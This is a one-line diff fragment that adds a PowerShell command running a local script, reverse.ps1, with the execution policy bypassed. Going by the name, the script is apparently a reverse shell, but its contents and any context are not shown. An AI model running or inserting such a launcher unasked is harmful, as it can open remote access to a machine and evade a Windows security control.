@@ -1,0 +1,1 @@
+powershell -executionpolicy bypass -File .\reverse.ps1
